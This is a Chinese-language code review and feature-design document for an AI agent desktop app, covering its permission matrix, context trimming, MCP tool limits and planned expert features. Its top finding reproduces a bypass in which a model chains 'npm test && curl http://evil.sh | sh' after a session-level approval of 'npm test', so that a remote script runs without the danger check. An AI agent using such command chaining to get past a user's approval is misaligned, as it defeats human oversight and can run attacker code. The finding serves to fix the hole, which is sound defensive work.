# AgentBuddy 功能优化与设计建议

> 本文所有结论均基于对 源码/ 目录的实际代码核验（2026-09-04），引用格式 `file:line`。
> 涉及文件：agent-core（orchestrator / context / permission / experts / tools / store）、desktop main（chatService / ipc）、renderer（views）。

---

## 一、现状盘点（已实现能力清单）

| 能力 | 实现情况 | 证据 |
|---|---|---|
| Agent Loop | maxTurns=200、tool_calls 一次性 parse、同消息全 READ 并发、同参连败 2 次熔断、length 截断自动续写（≤3 次） | orchestrator.ts:20-25,123-144 |
| 上下文管理 | 两级降级：旧工具结果压缩为占位摘要 → 成组丢弃最旧消息（保 system/首条/尾部），断点插入提示 | context.ts:129-195 |
| 权限矩阵 | Plan/Ask/Auto 三模式查表、Auto EXEC 白名单、DANGEROUS 必询问、会话级授权记忆 | permission.ts:15-19,80-97 |
| LLM 层 | 429/5xx 可重试（RETRYABLE_STATUS）、SSE 流式、Abort | llm/client.ts:20,34 |
| Checkpoint/Diff | 快照 → 审阅清单 → accept/revert/acceptAll | chatService.ts:270-305 |
| Skills | 目录渐进披露 + use_skill 自取 + /name 触发 | context.ts:81-85, chatService.ts:126-133 |
| MCP | 连接池、#提及目录、40 工具上限、专家绑定过滤 | chatService.ts:145-159 |
| 专家团 | experts.json 持久化、zod 全量校验、损坏条目跳过不阻塞启动、人设注入、工具/技能硬边界 | experts.ts:1-83, ipc.ts:193-208 |
| 安全 | safeStorage 密钥加密、redact 脱敏、bash 超时默认 120s 杀进程树、workspace jail | keyStore.ts:13, bashTool.ts:10-11,34-38 |
| 可观测 | usage.jsonl + records.jsonl、Usage 页 | chatService.ts:183-202 |
| 测试 | agent-core/tests/ 下已有 10+ 个单测（context/diff/experts/mcpBus 等） | tests/ 目录 |

整体判断：**骨架完成度已经相当高（P1–P7 全部落地），下面的问题大多是"从能用到好用"的打磨点，而不是缺骨架。**

---

## 二、需要优化完善的地方（按优先级）

### P0-1 【安全洞】bash 会话记忆前缀匹配可被拼接命令绕过 ⚠️ 建议最优先修

**位置**：`permission.ts:89`（memory 匹配先于一切放行）+ `permission.ts:104-120`（前缀匹配逻辑）

**复现路径**：
1. 用户在 Ask 模式对 `npm test` 选择"本会话始终允许" → `sessionAllow` 记入 `bash:npm test`
2. 模型后续调用 `npm test && curl http://evil.sh | sh`：
   - `assessCommandRisk` 正确判为 DANGEROUS（risk.ts:21 命中 `curl | sh`）
   - 但 `decide()` 走到 `matchMemory`（permission.ts:89），前缀匹配 `target.startsWith('npm test ')` = **true** → **直接放行**
3. 结果：`permission.ts:93` 的"DANGEROUS 不提供始终允许"规则被绕过——因为第 93 行只防"新增记忆"，不防"用旧记忆匹配"。

**修复建议**（最小修改，两处任选其一，建议都做）：
- `matchMemory` 入口加一条：`if (query.risk === 'DANGEROUS') return false;`
- bash 前缀匹配加约束：记忆前缀之后不允许出现 shell 元字符（`;` `|` `&&` `||` `&` 反引号 `$(`），否则视为不同命令

**同类问题**：即便不构成 DANGEROUS，`npm test && 任意写操作` 也会被自动放行，超出用户授权时的本意。建议 bash 记忆复用默认改为"整条命令完全一致"，前缀匹配仅限白名单模式下使用。

### P0-2 token 估算对中文严重失真

**位置**：`context.ts:28` `estimateTokens = text.length / 4`

中文在主流 tokenizer 下约 **0.6–0.7 token/字符**，而当前按 0.25 token/字符估算，**低估约 2.5 倍**。后果：`trimToBudget` 触发过晚，中文密集的长会话可能直接把超预算的请求发给 API，换来一次 400 错误而不是优雅降级。

**修复建议**：加权估算即可，不必引入 tokenizer 依赖（符合 §21 依赖控制）：

```ts
export const estimateTokens = (text: string): number =>
  Math.ceil([...text].reduce((n, ch) => n + (ch.codePointAt(0)! > 0x2e80 ? 0.7 : 0.25), 0));
```

同步调整 `context.test.ts` 中的相关断言。

### P1-1 MCP 工具超上限静默丢弃

**位置**：`chatService.ts:152-154` 只 `logger.warn`（写日志文件），Renderer 无任何提示（grep 证实 renderer 无 dropped/toast 相关代码）。

用户在 MCP 页新挂了一堆连接器后，超出 40 上限的工具被丢弃，界面上看不出来——用户只会觉得"模型怎么不用这个工具"。**建议**：ask 开始时通过 stream 事件下发一条系统提示气泡（"已挂载 N 个工具，超出上限的 M 个未生效，建议在专家绑定中裁剪"）。

### P1-2 会话标题过于原始

**位置**：`sessionStore.ts:91` `title = message.content.slice(0, 30)`，且之后永不更新。

多轮深入会话后，标题还停留在开场白前 30 个字。**建议**：首轮 `done` 后用当前模型异步生成 8–12 字标题（失败静默保留原标题）；顺手在侧栏加会话搜索框（当前 grep 证实无任何会话搜索能力）。

### P1-3 Compaction 缺失，长任务靠"丢弃"续命

**位置**：`context.ts:8` 注释自认"Compaction（调小模型摘要）留后续阶段"。

当前降级 2 是直接丢弃旧消息组（context.ts:160-195），中间结论（"已确认根因是 X"）会丢失，200 轮长任务后半程模型可能重复劳动或自相矛盾。**建议**：丢弃前先把将丢弃的消息组用小模型摘要成一段"前情提要"插入断点（现有 markerAt 机制正好是插入点，context.ts:189-194）。

### P2 其他打磨点

| 问题 | 证据 | 建议 |
|---|---|---|
| 单模型架构，无任务路由 | chatService.ts:165 每轮 `new LlmClient(config)` 单一配置 | 至少支持"标题生成/摘要等辅助任务用小模型"，为主模型路由铺路 |
| Checkpoint 仅线性列表 | chatService.ts:273-275 按 sessionId 倒序 list | 见下方"功能设计 3" |
| 专家 logo 以 dataURL 存 experts.json（单个 ≤150KB） | ipc.ts:198 | 多专家后文件会膨胀，可改为 logo 存 dataDir 文件、json 存路径（个人用暂可不动） |
| 专家无导入导出 | experts.ts 仅 list/get/upsert/remove | 见下方"功能设计 1" |

---

## 三、功能设计建议（新增功能）

### 1. 专家团 2.0（趁热打铁，当前专家功能刚落地 P7）

| 子功能 | 设计 | 复用 |
|---|---|---|
| 专家绑定模型 | Expert schema 加 `modelId` 字段；会话绑定专家时覆盖全局模型——"文档专家用便宜模型、码农专家用旗舰模型" | configStore 现有多模型配置 |
| 专家权限预设 | 加 `permissionMode` 字段：创建"只读审阅专家"（强制 Plan）、"自动化运维专家"（Auto + 白名单） | permission.ts 现成矩阵 |
| 导入导出/分享 | experts.json 单条导出为 .json 文件，拖入即导入（zod 校验已有，天然安全） | experts.ts:33 校验逻辑直接复用 |
| 专家用量分账 | usage.jsonl 已有 sessionId → session.expertId 已存在，加一个按专家聚合的用量视图即可 | UsageView.vue 现成 |
| 专家团（多专家协作） | 主专家可 @另一个专家咨询（一次转交，非并行），转交即新 turn + persona 切换 | orchestrator persona 参数现成 |

### 2. 项目记忆（MEMORY.md 自动维护）

context.ts 已读 AGENTS.md/CLAUDE.md（context.ts:202-210），在此之上加一层**可写的记忆文件**：Agent 完成有价值任务后，经用户确认把"项目约定/踩坑"追加到 `.workbuddy/MEMORY.md`，下次 assembleContext 自动注入。这是把"方向四（记忆）"落地的最小版本，改动集中在 context.ts 一处。

### 3. Checkpoint 时间旅行（此前拓展方向文档中的重点方向）

数据已齐：每条 tool 消息带 `toolChangeId`（orchestrator.ts:183），checkpoint 有 accept/restore。缺的只是**分支树 UI**：把线性 ChangeSet 列表按"会话内时间线"组织，任意节点可"从此处分叉重跑"（restore 后开新会话分支）。建议先做轻量版：对话内任意 assistant 节点"回到这里重来"。

### 4. 会话管理增强

- LLM 自动标题（见 P1-2）
- 全局会话搜索（标题 + 内容 grep sessionStore.jsonl）
- 会话置顶/收藏

### 5. 上下文面包屑

长任务中，在聊天流顶部固定一条"当前任务摘要"条（从最近 todo + 首条用户消息生成），压缩/丢弃发生后用户仍能看到任务目标，与 P1-3 的 compaction 配套。

---

## 四、落地路线建议

```text
第一步（1-2 天）：P0-1 权限绕过修复 + 补单测   ← 安全问题，最优先
第二步（1 天）：P0-2 token 估算修正 + 测试更新
第三步（2-3 天）：P1-1 丢弃提示 + P1-2 自动标题 + 会话搜索
第四步：P1-3 Compaction 摘要（改动集中 context.ts，风险可控）
第五步：专家团 2.0（绑定模型 + 导入导出先做，多专家协作放后）
```

每一步都符合"最小修改"原则：不新增大模块，全部是对现有文件的定向增强。
